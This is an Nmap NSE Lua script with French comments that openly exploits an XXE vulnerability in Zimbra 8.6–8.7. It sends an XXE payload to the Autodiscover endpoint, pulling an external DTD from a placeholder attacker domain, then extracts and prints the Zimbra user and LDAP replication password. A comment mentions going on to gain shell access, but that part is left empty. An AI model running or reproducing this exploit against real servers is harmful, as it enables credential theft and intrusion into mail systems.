local string = require "string"
local httpspider = require "httpspider"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"
local table = require "table"

-- Prérequis: nmap version 7.70+
-- Exécution: nmap -p 80 --script exploit-http-zimbra-xxe <target>

description = [[
Exploite une vulnérabilité XXE dans Zimbra pour extraire les informations d'identification et obtenir un accès shell sur le serveur. Applicable à Zimbra version 8.6 à 8.7
]]

-- Définir les dépendances nmap et les bibliothèques http pour gérer les requêtes
-- dependencies = { "http" }

portrule = shortport.http

-- Spécifier les PoCs en tant que script NSE
action = function(host, port)

local opts = {header={}}
opts["header"]["User-Agent"] = 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0'
opts["header"]["Accept"] = '*/*' -- 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'

    --local http = require "http"
   -- local target = string.format("https://%s", host)
    local path = "/Autodiscover/Autodiscover.xml"

    -- Configuration de la requête XML pour récupérer les informations d'identification
    local xml_payload = [[
        <!DOCTYPE Autodiscover [
            <!ENTITY % dtd SYSTEM 'https://YOUR-DOMAIN/malicious_dtd'>
            %dtd;
            %all;
        ]>
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
            <Request>
                <EMailAddress>aaaaa</EMailAddress>
                <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
    ]]

    -- Envoi de la requête POST avec le payload XML
    local response = http.post(host, port, path, nil, xml_payload)

    -- Extraction des informations d'identification à partir de la réponse
    local zimbra_user = response.body:match('<key name="zimbra_user">([^<]+)</value>')
    local zimbra_password = response.body:match('<key name="ldap_replication_password">([^<]+)</value>')

-- print(response.body)
    if zimbra_user and zimbra_password then
        print("[+] Identifiants Zimbra récupérés: " .. zimbra_user .. ":" .. zimbra_password)
    else
        print("[-] Impossible de récupérer les identifiants Zimbra.")
        return
    end

    -- Exécuter d'autres commandes pour obtenir un accès shell

    -- ...
end